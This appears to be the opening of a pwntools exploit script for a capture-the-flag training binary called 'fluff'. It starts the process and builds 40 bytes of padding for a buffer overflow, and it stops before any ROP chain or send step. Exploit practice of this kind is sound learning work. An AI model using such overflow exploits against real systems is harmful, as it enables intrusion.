from pwn import *

p = process('./fluff')
elf = ELF('./fluff')
 
payload = b'A'*40
